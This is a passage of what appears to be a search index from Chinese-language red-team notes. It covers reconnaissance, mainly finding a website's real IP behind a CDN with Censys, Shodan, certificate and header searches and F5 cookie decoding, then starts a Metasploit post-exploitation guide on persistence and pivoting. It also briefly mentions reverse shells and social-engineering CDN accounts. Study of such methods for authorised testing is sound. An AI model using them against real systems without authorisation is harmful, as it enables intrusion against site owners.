\u548cC\u6bb5","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_1","text":"whois\u67e5\u8be2 \u6536\u96c6\u5b50\u57df\u540d \u7aef\u53e3\u626b\u63cf \u67e5\u627e\u771f\u5b9eip \u63a2\u6d4b\u65c1\u7ad9\u53caC\u6bb5 \u7f51\u7edc\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce \u626b\u63cf\u654f\u611f\u76ee\u5f55/\u6587\u4ef6 \u6307\u7eb9\u8bc6\u522b","title":"\u4fe1\u606f\u6536\u96c6"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_2","text":"","title":"\u975e\u5e38\u89c4\u64cd\u4f5c"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ssltls","text":"","title":"SSL/TLS\u8bc1\u4e66\u67e5\u8be2"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#_3","text":"","title":""},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#ip","text":"\u7ed5\u8fc7CDN\u7684\u591a\u79cd\u65b9\u6cd5\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 https://www.cnblogs.com/qiudabai/p/9763739.html","title":"\u67e5\u627e\u771f\u5b9eIP"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#0x01-cdn","text":"\u65b9\u6cd51\uff1a\u5404\u79cd\u591a\u5730 ping \u7684\u670d\u52a1\uff0c\u67e5\u770b\u5bf9\u5e94 IP \u5730\u5740\u662f\u5426\u552f\u4e00 \u65b9\u6cd52\uff1a\u4f7f\u7528 nslookup \u8fdb\u884c\u68c0\u6d4b\uff0c\u539f\u7406\u540c\u4e0a\uff0c\u5982\u679c\u8fd4\u56de\u57df\u540d\u89e3\u6790\u5bf9\u5e94\u591a\u4e2a IP \u5730\u5740\u591a\u534a\u662f\u4f7f\u7528\u4e86 CDN","title":"0x01 \u9a8c\u8bc1\u662f\u5426\u5b58\u5728CDN"},{"location":"redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/#0x02-cdn-ip","text":"\u65b9\u6cd51:\u67e5\u8be2\u5386\u53f2DNS\u8bb0\u5f55 \u65b9\u6cd52:\u67e5\u8be2\u5b50\u57df\u540d \u5fae\u6b65\u5728\u7ebf Dnsdb\u67e5\u8be2\u6cd5 Google \u641c\u7d22 \u5404\u79cd\u5b50\u57df\u540d\u626b\u63cf\u5668 \u65b9\u6cd53\uff1a\u7f51\u7edc\u7a7a\u95f4\u5f15\u64ce\u641c\u7d22\u6cd5 \u5e38\u89c1\u7684\u6709\u4ee5\u524d\u7684\u949f\u9997\u4e4b\u773c\uff0c shodan \uff0c fofa\u641c\u7d22 \u3002\u4ee5fofa\u4e3a\u4f8b\uff0c\u53ea\u9700\u8f93\u5165\uff1atitle:\u201c\u7f51\u7ad9\u7684title\u5173\u952e\u5b57\u201d\u6216\u8005body\uff1a\u201c\u7f51\u7ad9\u7684body\u7279\u5f81\u201d\u5c31\u53ef\u4ee5\u627e\u51fafofa\u6536\u5f55\u7684\u6709\u8fd9\u4e9b\u5173\u952e\u5b57\u7684ip\u57df\u540d\uff0c\u5f88\u591a\u65f6\u5019\u80fd\u83b7\u53d6\u7f51\u7ad9\u7684\u771f\u5b9eip\uff0c\u5982\u56fe\uff1a \u65b9\u6cd54:\u5229\u7528SSL\u8bc1\u4e66\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u4f7f\u7528\u7ed9\u5b9a\u7684\u57df\u540d \u5047\u5982\u4f60\u5728xyz123boot.com\u4e0a\u6258\u7ba1\u4e86\u4e00\u4e2a\u670d\u52a1\uff0c\u539f\u59cb\u670d\u52a1\u5668IP\u662f136.23.63.44\u3002 \u800cCloudFlare\u5219\u4f1a\u4e3a\u4f60\u63d0\u4f9bDDoS\u4fdd\u62a4\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\u548c\u5176\u4ed6\u4e00\u4e9b\u5b89\u5168\u670d\u52a1\uff0c\u4ee5\u4fdd\u62a4\u4f60\u7684\u670d\u52a1\u514d\u53d7\u653b\u51fb\u3002\u4e3a\u6b64\uff0c\u4f60\u7684Web\u670d\u52a1\u5668\u5c31\u5fc5\u987b\u652f\u6301SSL\u5e76\u5177\u6709\u8bc1\u4e66\uff0c\u6b64\u65f6CloudFlare\u4e0e\u4f60\u7684\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u5c31\u50cf\u4f60\u548cCloudFlare\u4e4b\u95f4\u7684\u901a\u4fe1\u4e00\u6837\uff0c\u4f1a\u88ab\u52a0\u5bc6\uff08\u5373\u6ca1\u6709\u7075\u6d3b\u7684SSL\u5b58\u5728\uff09\u3002\u8fd9\u770b\u8d77\u6765\u5f88\u5b89\u5168\uff0c\u4f46\u95ee\u9898\u662f\uff0c\u5f53\u4f60\u5728\u7aef\u53e3443\uff08 https://136.23.63.44:443\uff09\u4e0a\u76f4\u63a5\u8fde\u63a5\u5230IP\u65f6\uff0cSSL\u8bc1\u4e66\u5c31\u4f1a\u88ab\u66b4\u9732\u3002 \u6b64\u65f6\uff0c\u5982\u679c\u653b\u51fb\u8005\u626b\u63cf0.0.0.0/0\uff0c\u5373\u6574\u4e2a\u4e92\u8054\u7f51\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5728\u7aef\u53e3443\u4e0a\u83b7\u53d6\u5728xyz123boot.com\u4e0a\u7684\u6709\u6548\u8bc1\u4e66\uff0c\u8fdb\u800c\u83b7\u53d6\u63d0\u4f9b\u7ed9\u4f60\u7684Web\u670d\u52a1\u5668IP\u3002 \u76ee\u524dCensys\u5de5\u5177\u5c31\u80fd\u5b9e\u73b0\u5bf9\u6574\u4e2a\u4e92\u8054\u7f51\u7684\u626b\u63cf\uff0cCensys\u662f\u4e00\u6b3e\u7528\u4ee5\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u4fe1\u606f\u7684\u65b0\u578b\u641c\u7d22\u5f15\u64ce\uff0c\u5b89\u5168\u4e13\u5bb6\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u8bc4\u4f30\u4ed6\u4eec\u5b9e\u73b0\u65b9\u6848\u7684\u5b89\u5168\u6027\uff0c\u800c\u9ed1\u5ba2\u5219\u53ef\u4ee5\u4f7f\u7528\u5b83\u4f5c\u4e3a\u524d\u671f\u4fa6\u67e5\u653b\u51fb\u76ee\u6807\u3001\u6536\u96c6\u76ee\u6807\u4fe1\u606f\u7684\u5f3a\u5927\u5229\u5668\u3002Censys\u641c\u7d22\u5f15\u64ce\u80fd\u591f\u626b\u63cf\u6574\u4e2a\u4e92\u8054\u7f51\uff0cCensys\u6bcf\u5929\u90fd\u4f1a\u626b\u63cfIPv4\u5730\u5740\u7a7a\u95f4\uff0c\u4ee5\u641c\u7d22\u6240\u6709\u8054\u7f51\u8bbe\u5907\u5e76\u6536\u96c6\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u5e76\u8fd4\u56de\u4e00\u4efd\u6709\u5173\u8d44\u6e90\uff08\u5982\u8bbe\u5907\u3001\u7f51\u7ad9\u548c\u8bc1\u4e66\uff09\u914d\u7f6e\u548c\u90e8\u7f72\u4fe1\u606f\u7684\u603b\u4f53\u62a5\u544a\u3002 \u800c\u653b\u51fb\u8005\u552f\u4e00\u9700\u8981\u505a\u7684\u5c31\u662f\u628a\u4e0a\u9762\u7528\u6587\u5b57\u63cf\u8ff0\u7684\u641c\u7d22\u8bcd\u7ffb\u8bd1\u6210\u5b9e\u9645\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u3002 xyz123boot.com\u8bc1\u4e66\u7684\u641c\u7d22\u67e5\u8be2\u53c2\u6570\u4e3a\uff1aparsed.names\uff1axyz123boot.com \u53ea\u663e\u793a\u6709\u6548\u8bc1\u4e66\u7684\u67e5\u8be2\u53c2\u6570\u4e3a\uff1atags.raw\uff1atrusted \u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u5b9e\u73b0\u591a\u4e2a\u53c2\u6570\u7684\u7ec4\u5408\uff0c\u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u7b80\u5355\u7684\u5e03\u5c14\u903b\u8f91\u6765\u5b8c\u6210\u3002 \u7ec4\u5408\u540e\u7684\u641c\u7d22\u53c2\u6570\u4e3a\uff1aparsed.names: xyz123boot.com and tags.raw: trusted Censys\u5c06\u5411\u4f60\u663e\u793a\u7b26\u5408\u4e0a\u8ff0\u641c\u7d22\u6761\u4ef6\u7684\u6240\u6709\u6807\u51c6\u8bc1\u4e66\uff0c\u4ee5\u4e0a\u8fd9\u4e9b\u8bc1\u4e66\u662f\u5728\u626b\u63cf\u4e2d\u627e\u5230\u7684\u3002 \u8981\u9010\u4e2a\u67e5\u770b\u8fd9\u4e9b\u641c\u7d22\u7ed3\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5355\u51fb\u53f3\u4fa7\u7684\u201cExplore\u201d\uff0c\u6253\u5f00\u5305\u542b\u591a\u4e2a\u5de5\u5177\u7684\u4e0b\u62c9\u83dc\u5355\u3002What's using this certificate? > IPv4 Hosts \u6b64\u65f6\uff0c\u653b\u51fb\u8005\u5c06\u770b\u5230\u4e00\u4e2a\u4f7f\u7528\u7279\u5b9a\u8bc1\u4e66\u7684IPv4\u4e3b\u673a\u5217\u8868\uff0c\u800c\u771f\u5b9e\u539f\u59cb IP\u5c31\u85cf\u5728\u5176\u4e2d\u3002 \u4f60\u53ef\u4ee5\u901a\u8fc7\u5bfc\u822a\u5230\u7aef\u53e3443\u4e0a\u7684IP\u6765\u9a8c\u8bc1\uff0c\u770b\u5b83\u662f\u5426\u91cd\u5b9a\u5411\u5230xyz123boot.com\uff1f\u6216\u5b83\u662f\u5426\u76f4\u63a5\u5728IP\u4e0a\u663e\u793a\u7f51\u7ad9\uff1f \u4f7f\u7528\u7ed9\u5b9a\u7684SSL\u8bc1\u4e66 \u5982\u679c\u4f60\u662f\u6267\u6cd5\u90e8\u95e8\u7684\u4eba\u5458\uff0c\u60f3\u8981\u627e\u51fa\u4e00\u4e2a\u9690\u85cf\u5728cheesecp5vaogohv.onion\u4e0b\u7684\u513f\u7ae5\u8272\u60c5\u7f51\u7ad9\u3002\u505a\u597d\u7684\u529e\u6cd5\uff0c\u5c31\u662f\u627e\u5230\u5176\u539f\u59cbIP\uff0c\u8fd9\u6837\u4f60\u5c31\u53ef\u4ee5\u8ffd\u8e2a\u5230\u5176\u6258\u7ba1\u7684\u670d\u52a1\u5668\uff0c\u751a\u81f3\u67e5\u5230\u80cc\u540e\u7684\u8fd0\u8425\u5546\u4ee5\u53ca\u91d1\u878d\u7ebf\u7d22\u3002 \u9690\u85cf\u670d\u52a1\u5177\u6709SSL\u8bc1\u4e66\uff0c\u8981\u67e5\u627e\u5b83\u4f7f\u7528\u7684IPv4\u4e3b\u673a\uff0c\u53ea\u9700\u5c06\"SHA1 fingerprint\"\uff08\u7b7e\u540d\u8bc1\u4e66\u7684sha1\u503c\uff09\u7c98\u8d34\u5230Censys IPv4\u4e3b\u673a\u641c\u7d22\u4e2d\uff0c\u5373\u53ef\u627e\u5230\u8bc1\u4e66\uff0c\u4f7f\u7528\u6b64\u65b9\u6cd5\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u914d\u7f6e\u9519\u8bef\u7684Web\u670d\u52a1\u5668\u3002 \u65b9\u6cd55:\u5229\u7528HTTP\u6807\u5934\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u501f\u52a9SecurityTrails\u8fd9\u6837\u7684\u5e73\u53f0\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u5728\u832b\u832b\u7684\u5927\u6570\u636e\u641c\u7d22\u5230\u81ea\u5df1\u7684\u76ee\u6807\uff0c\u751a\u81f3\u53ef\u4ee5\u901a\u8fc7\u6bd4\u8f83HTTP\u6807\u5934\u6765\u67e5\u627e\u5230\u539f\u59cb\u670d\u52a1\u5668\u3002 \u7279\u522b\u662f\u5f53\u7528\u6237\u62e5\u6709\u4e00\u4e2a\u975e\u5e38\u7279\u522b\u7684\u670d\u52a1\u5668\u540d\u79f0\u4e0e\u8f6f\u4ef6\u540d\u79f0\u65f6\uff0c\u653b\u51fb\u8005\u627e\u5230\u4f60\u5c31\u53d8\u5f97\u66f4\u5bb9\u6613\u3002 \u5982\u679c\u8981\u641c\u7d22\u7684\u6570\u636e\u76f8\u5f53\u591a\uff0c\u5982\u4e0a\u6240\u8ff0\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728Censys\u4e0a\u7ec4\u5408\u641c\u7d22\u53c2\u6570\u3002\u5047\u8bbe\u4f60\u6b63\u5728\u4e0e1500\u4e2aWeb\u670d\u52a1\u5668\u5171\u4eab\u4f60\u7684\u670d\u52a1\u5668HTTP\u6807\u5934\uff0c\u8fd9\u4e9b\u670d\u52a1\u5668\u90fd\u53d1\u9001\u7684\u662f\u76f8\u540c\u7684\u6807\u5934\u53c2\u6570\u548c\u503c\u7684\u7ec4\u5408\u3002\u800c\u4e14\u4f60\u8fd8\u4f7f\u7528\u65b0\u7684PHP\u6846\u67b6\u53d1\u9001\u552f\u4e00\u7684HTTP\u6807\u5934\uff08\u4f8b\u5982\uff1aX-Generated-Via\uff1aXYZ\u6846\u67b6\uff09\uff0c\u76ee\u524d\u7ea6\u6709400\u540d\u7f51\u7ad9\u7ba1\u7406\u5458\u4f7f\u7528\u4e86\u8be5\u6846\u67b6\u3002\u800c\u6700\u7ec8\u7531\u4e09\u4e2a\u670d\u52a1\u5668\u7ec4\u6210\u7684\u4ea4\u96c6\uff0c\u53ea\u9700\u624b\u52a8\u64cd\u4f5c\u5c31\u53ef\u4ee5\u627e\u5230\u4e86IP\uff0c\u6574\u4e2a\u8fc7\u7a0b\u53ea\u9700\u8981\u51e0\u79d2\u949f\u3002 \u4f8b\u5982\uff0cCensys\u4e0a\u7528\u4e8e\u5339\u914d\u670d\u52a1\u5668\u6807\u5934\u7684\u641c\u7d22\u53c2\u6570\u662f80.http.get.headers.server :\uff0c\u67e5\u627e\u7531CloudFlare\u63d0\u4f9b\u670d\u52a1\u7684\u7f51\u7ad9\u7684\u53c2\u6570\u5982\u4e0b\uff1a 80.http.get.headers.server:cloudflare \u65b9\u6cd56:\u5229\u7528\u7f51\u7ad9\u8fd4\u56de\u7684\u5185\u5bb9\u5bfb\u627e\u771f\u5b9e\u539f\u59cbIP \u5982\u679c\u539f\u59cb\u670d\u52a1\u5668IP\u4e5f\u8fd4\u56de\u4e86\u7f51\u7ad9\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u7f51\u4e0a\u641c\u7d22\u5927\u91cf\u7684\u76f8\u5173\u6570\u636e\u3002 \u6d4f\u89c8\u7f51\u7ad9\u6e90\u4ee3\u7801\uff0c\u5bfb\u627e\u72ec\u7279\u7684\u4ee3\u7801\u7247\u6bb5\u3002\u5728JavaScript\u4e2d\u4f7f\u7528\u5177\u6709\u8bbf\u95ee\u6216\u6807\u8bc6\u7b26\u53c2\u6570\u7684\u7b2c\u4e09\u65b9\u670d\u52a1\uff08\u4f8b\u5982Google Analytics\uff0creCAPTCHA\uff09\u662f\u653b\u51fb\u8005\u7ecf\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\u3002 \u4ee5\u4e0b\u662f\u4eceHackTheBox\u7f51\u7ad9\u83b7\u53d6\u7684Google Analytics\u8ddf\u8e2a\u4ee3\u7801\u793a\u4f8b\uff1a ga\uff08'create'\uff0c'UA-93577176-1'\uff0c'auto'\uff09; \u53ef\u4ee5\u4f7f\u752880.http.get.body\uff1a\u53c2\u6570\u901a\u8fc7body/source\u8fc7\u6ee4Censys\u6570\u636e\uff0c\u4e0d\u5e78\u7684\u662f\uff0c\u6b63\u5e38\u7684\u641c\u7d22\u5b57\u6bb5\u6709\u5c40\u9650\u6027\uff0c\u4f46\u4f60\u53ef\u4ee5\u5728Censys\u8bf7\u6c42\u7814\u7a76\u8bbf\u95ee\u6743\u9650\uff0c\u8be5\u6743\u9650\u5141\u8bb8\u4f60\u901a\u8fc7Google BigQuery\u8fdb\u884c\u66f4\u5f3a\u5927\u7684\u67e5\u8be2\u3002 Shodan\u662f\u4e00\u79cd\u7c7b\u4f3c\u4e8eCensys\u7684\u670d\u52a1\uff0c\u4e5f\u63d0\u4f9b\u4e86http.html\u641c\u7d22\u53c2\u6570\u3002 \u641c\u7d22\u793a\u4f8b\uff1a https://www.shodan.io/search?query=http.html%3AUA-32023260-1 \u65b9\u6cd57:\u4f7f\u7528\u56fd\u5916\u4e3b\u673a\u89e3\u6790\u57df\u540d \u65b9\u6cd58:\u7f51\u7ad9\u6f0f\u6d1e\u67e5\u627e 1\uff09\u76ee\u6807\u654f\u611f\u6587\u4ef6\u6cc4\u9732\uff0c\u4f8b\u5982\uff1a.git\u6587\u4ef6\u6cc4\u9732\uff0c.svn\u6587\u4ef6\u6cc4\u9732\uff0cphpinfo\u4e4b\u7c7b\u7684\u63a2\u9488\u3001GitHub\u4fe1\u606f\u6cc4\u9732\u7b49\u3002 2\uff09XSS\u76f2\u6253\uff0c\u547d\u4ee4\u6267\u884c\u53cd\u5f39shell\uff0cSSRF\u7b49\u3002 3\uff09\u65e0\u8bba\u662f\u7528\u793e\u5de5\u8fd8\u662f\u5176\u4ed6\u624b\u6bb5\uff0c\u62ff\u5230\u4e86\u76ee\u6807\u7f51\u7ad9\u7ba1\u7406\u5458\u5728CDN\u7684\u8d26\u53f7\uff0c\u4ece\u800c\u5728\u4eceCDN\u7684\u914d\u7f6e\u4e2d\u627e\u5230\u7f51\u7ad9\u7684\u771f\u5b9eIP\u3002 \u65b9\u6cd59:\u7f51\u7ad9\u90ae\u4ef6\u8ba2\u9605\u67e5\u627e \u65b9\u6cd510\uff1a\u7528 Zmap \u626b\u5168\u7f51 \u9700\u8981\u627e xiaix.me \u7f51\u7ad9\u7684\u771f\u5b9e IP\uff0c\u6211\u4eec\u9996\u5148\u4ece apnic \u83b7\u53d6 IP \u6bb5\uff0c\u7136\u540e\u4f7f\u7528 Zmap \u7684 banner-grab \u626b\u63cf\u51fa\u6765 80 \u7aef\u53e3\u5f00\u653e\u7684\u4e3b\u673a\u8fdb\u884c banner \u6293\u53d6\uff0c\u6700\u540e\u5728 http-req \u4e2d\u7684 Host \u5199 xiaix.me \u65b9\u6cd511\uff1aF5 LTM\u89e3\u7801\u6cd5 \u5f53\u670d\u52a1\u5668\u4f7f\u7528F5 LTM\u505a\u8d1f\u8f7d\u5747\u8861\u65f6\uff0c\u901a\u8fc7\u5bf9set-cookie\u5173\u952e\u5b57\u7684\u89e3\u7801\u771f\u5b9eip\u4e5f\u53ef\u88ab\u83b7\u53d6\uff0c\u4f8b\u5982\uff1aSet-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000\uff0c\u5148\u628a\u7b2c\u4e00\u5c0f\u8282\u7684\u5341\u8fdb\u5236\u6570\u5373487098378\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u4e3a\u5341\u516d\u8fdb\u5236\u65701d08880a\uff0c\u63a5\u7740\u4ece\u540e\u81f3\u524d\uff0c\u4ee5\u6b64\u53d6\u56db\u4f4d\u6570\u51fa\u6765\uff0c\u4e5f\u5c31\u662f0a.88.08.1d\uff0c\u6700\u540e\u4f9d\u6b21\u628a\u4ed6\u4eec\u8f6c\u4e3a\u5341\u8fdb\u5236\u657010.136.8.29\uff0c\u4e5f\u5c31\u662f\u6700\u540e\u7684\u771f\u5b9eip 0 x 0 5 \u65c1 \u7ad9 \u548cC\u6bb5","title":"0x02 \u7ed5\u8fc7 CDN \u67e5\u627e\u7f51\u7ad9\u771f\u5b9e IP"},{"location":"redteam/%E5%90%8E%E6%B8%97%E9%80%8F/","text":"Metasploit \u540e\u5229\u7528\u547d\u4ee4\u5217\u8868 \u00b6 \u76ee\u5f55 Windows \u539f\u751f Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Java Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Linux \u4e0a\u7684 PHP Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Windows \u4e0a\u7684 PHP Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c Linux Meterpreter \u5728\u573a \u6301\u4e45\u6027 \u65cb\u8f6c \u4fe1\u606f\u6536\u96c6 Meterpreter \u811a\u672c \u53d1\u5e03\u6a21\u5757 \u53d6\u81ea WINDOWS \u5217\u8868\uff0c\u9700\u8981\u683c\u5f0f\u5316 \u6709\u7528\u7684 Meterpreter \u5e16\u5b50\u6a21\u5757 \u6709\u7528\u7684\u591a\u6b65\u9aa4\u6280\u672f \u5b58\u5728\u3001\u6301\u4e45\u6027\u548c\u65cb\u8f6c \u00b6 \u6bcf\u4e2a\u4eba\u505a\u4e8b\u7684\u65b9\u5f0f\u90fd\u4e0d\u4e00\u6837\uff0c\u89e3\u91ca\u653b\u51fb\u8005\u5728\u83b7\u5f97 shell \u65f6\u4f1a\u7ecf\u5386\u4ec0\u4e48\u51e0\u4e4e\u662f\u4e0d\u53ef\u80fd\u7684\uff0c\u751a\u81f3\u66f4\u4e0d\u80fd\u6982\u62ec\u4e3a\u4e00\u79cd\u65b9\u6cd5\u8bba\uff0c\u4f46\u6211\u5df2\u7ecf\u5c1d\u8bd5\u901a\u8fc7\"3\\'P\\'s of Post Exploitation\"\u548c\u51fa\u4e8e\u67d0\u79cd\u539f\u56e0\uff0c\u5b83\u4eec\u5904\u4e8e\u7279\u5b9a\u987a\u5e8f\uff0c\u4f46\u80af\u5b9a\u53d6\u51b3\u4e8e\u6700\u4f73\u987a\u5e8f\u3002 \u7b2c\u4e00\u4e2a P \u662f\u5b58\u5728\u3002\u9996\u5148\u662f\u56e0\u4e3a\u653b\u51fb\u8005\u9700\u8981\u5728\u4ed6\u4eec\u7ee7\u7eed\u524d\u8fdb\u4e4b\u524d\u4e86\u89e3\u4ed6/\u5979\u5f97\u5230\u4e86\u4ec0\u4e48\u3002\u5b83\u5728\u5176\u4ed6\u4e24\u4e2a\"P\"\u4e2d\u8d77\u7740\u81f3\u5173\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u4f7f\u5b83\u4eec\u66f4\u9690\u853d\u6216\u66f4\u5bb9\u6613\u3002\u5f88\u591a\u6b21\u6211\u770b\u5230\u4eba\u4eec\u4ece\u4e00\u4e2a\u76d2\u5b50\u8df3\u5230\u53e6\u4e00\u4e2a\u76d2\u5b50\uff0c\u5b8c\u5168\u9519\u8fc7\u4e86\u4ed6\u4eec\u6b63\u5728\u5bfb\u627e\u7684\u7b2c\u4e00\u4e2a\u76d2\u5b50\u3002\u6240\u4ee5\"\u5b58\u5728\"\u5c31\u662f\u8981\u53d1\u73b0\u4f60\uff08\u653b\u51fb\u8005\uff09\u5df2\u7ecf\u62e5\u6709\u7684\u4e1c\u897f\u3002\u8fd9\u6709\u5f88\u591a\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u68c0\u67e5\u5b83\u4eec\u7684\u987a\u5e8f\u548c\u65b9\u5f0f\u4e5f\u662f\u4efb\u610f\u7684\uff0c\u4f46\u5b83\u4eec\u81f3\u5c11\u5e94\u8be5\u6709\u4e00\u4e2a\u8981\u68c0\u67e5\u7684\u7c7b\u522b\u68c0\u67e5\u5217\u8868\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u9700\u8981\u8003\u8651\u7684\u95ee\u9898\uff1a \u6587\u4ef6\u7cfb\u7edf\uff1a \u77e5\u9053\"\u5728\u54ea\u91cc\"\u67e5\u627e\u662f\u5f88\u56f0\u96be\u7684\uff0c\u4f46\u5728\u4e0b\u9762\u7684\u6bcf\u4e2a\u90e8\u5206\u4e2d\uff0c\u6211\u4eec\u5c06\u8fdb\u5165\u5df2\u77e5\u7684\u597d\u5730\u65b9\u8fdb\u884c\u68c0\u67e5\u4ee5\u53ca\u641c\u7d22\u5177\u6709\u6709\u8da3\u540d\u79f0\u548c\u6269\u5c55\u540d\u7684\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u65b9\u6cd5 \u64cd\u4f5c\u7cfb\u7edf \u4ee3\u7406\u8bbe\u7f6e\u3001\u7ec4\u7b56\u7565\u8bbe\u7f6e\u3001\u767b\u5f55\u811a\u672c\u3001MOTD\u3001\u7528\u6237\u5217\u8868\uff08\u7f51\u7edc\u7528\u6237\u548c /etc/passwd\uff09\u3002\u4e86\u89e3\u7cfb\u7edf\u548c\u653b\u51fb\u8005\u662f\u5982\u4f55\u53d7\u5230\u653b\u51fb\u7684\uff0c\u5bf9\u4e8e\u7406\u89e3\u5b83\u5982\u4f55\u4f5c\u4e3a\u7f51\u7edc\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u901a\u4fe1\u548c\u5de5\u4f5c\u81f3\u5173\u91cd\u8981\u3002 \u5185\u5b58 \u4e3b\u8981\u4ee5\u4ece\u4e2d\u63d0\u53d6\u54c8\u5e0c\u548c\u51ed\u636e\u800c\u95fb\u540d\uff0c\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u6709\u8da3\u7684\u4e1c\u897f\u4ec5\u9a7b\u7559\u5728\u5185\u5b58\u4e2d \u5a92\u4f53 CD\u3001DVD\u3001NFS \u6302\u8f7d\u3001SMB \u6302\u8f7d\u3001USB \u8bb0\u5fc6\u68d2\u3002\u8fd9\u4e9b\u901a\u5e38\u5728\u653b\u51fb\u671f\u95f4\u88ab\u7ed5\u8fc7\u548c\u9057\u5fd8\uff0c\u4f46\u53ef\u4ee5\u638c\u63e1\u738b\u56fd\u7684\u94a5\u5319 \u7f51\u7edc \u8def\u7531\u3001ARP \u6761\u76ee\u3001netstat \u5f88\u5bb9\u6613\u68c0\u67e5\uff0c\u4f46\u5e7f\u64ad\u6d88\u606f\u3001\u4fa6\u542c\u5668\u548c IPv6 \u4e0d\u592a\u5e38\u89c1\u3002 \u6743\u9650\u548c\u51ed\u636e \u8fd9\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u4f46\u901a\u5e38\u6709\u5927\u91cf\u6570\u636e\uff0c\u56e0\u4e3a\u5373\u4f7f TinyCore linux \u4e5f\u6709\u6570\u767e\u4e2a\u6587\u4ef6\uff0c\u6bcf\u4e2a\u6587\u4ef6\u90fd\u6709\u81ea\u5df1\u7684\u6743\u9650\u3002\u6b64\u7c7b\u522b\u8d85\u51fa\u4e86\u5176\u4ed6\u7c7b\u522b\u7684\u8fb9\u754c\uff0c\u4f46\u91cd\u8981\u7684\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u6b65\u9aa4\u5355\u72ec\u5217\u51fa\u3002 \u6301\u4e45\u6027\u662f\u5728\u4e0d\u540c\u7ea7\u522b\u4e0a\u5b9e\u73b0\u7684\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u653b\u51fb\u8005\u8bd5\u56fe\u751f\u5b58\u7684\u5185\u5bb9\u4ee5\u53ca\u653b\u51fb\u8005\u5728\u9690\u8eab\u65b9\u9762\u613f\u610f\u653e\u5f03\u7684\u5185\u5bb9\u3002\u4f8b\u5982\uff0c\u7559\u5728\u5185\u5b58\u4e2d\u51e0\u4e4e\u53ef\u4ee5\u6740\u6b7b\u653b\u51fb\u8005\u5728\u91cd\u65b0\u542f\u52a8\u540e\u5e78\u5b58\u7684\u673a\u4f1a\u3002\u5728\u91cd\u5efa\u6216\u6062\u590d\u4e2d\u751f\u5b58\u7684\u7b56\u7565\u4e5f\u975e\u5e38\u4e0d\u540c\u3002\u6301\u4e45\u6027\u4e5f\u53ef\u4ee5\u4ee5\u7b80\u5355\u8eab\u4efd\u9a8c\u8bc1\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u5982\u679c\u653b\u51fb\u8005\u6709\u5bc6\u7801\u5e76\u4e14\u5b83\u53ef\u4ee5\u8ba9\u4ed6/\u5979\u7684\u4ee3\u7801\u6267\u884c\u6216\u8bbf\u95ee\u4ed6\u4eec\u4e4b\u540e\u7684\u6570\u636e\uff0c\u90a3\u4e48\u8fd9\u5c31\u662f\u4ed6\u4eec\u6240\u9700\u8981\u7684\u4e00\u5207\u3002\u5e94\u7279\u522b\u5173\u6ce8\u6e17\u900f\u6d4b\u8bd5\u7684\u4fe1\u606f\u6536\u96c6\u90e8\u5206\u6216\u4e0e\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\u7684\u5730\u65b9\u6709\u5173\u7684\u7ea2\u961f\u53c2\u4e0e\u3002 Pivoting simple \u610f\u5473\u7740\u6269\u5c55\u653b\u51fb\u8005\u5f53\u524d\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u5e76\u4e14\u53ef\u80fd\u610f\u5473\u7740\u4ece\u8fde\u63a5\u5230\u8fdc\u7a0b NFS \u6302\u8f7d\u5230\u653b\u51fb\u8005 PSEXEC \u5c06\u4ed6\u4eec\u7684 Meterpreter 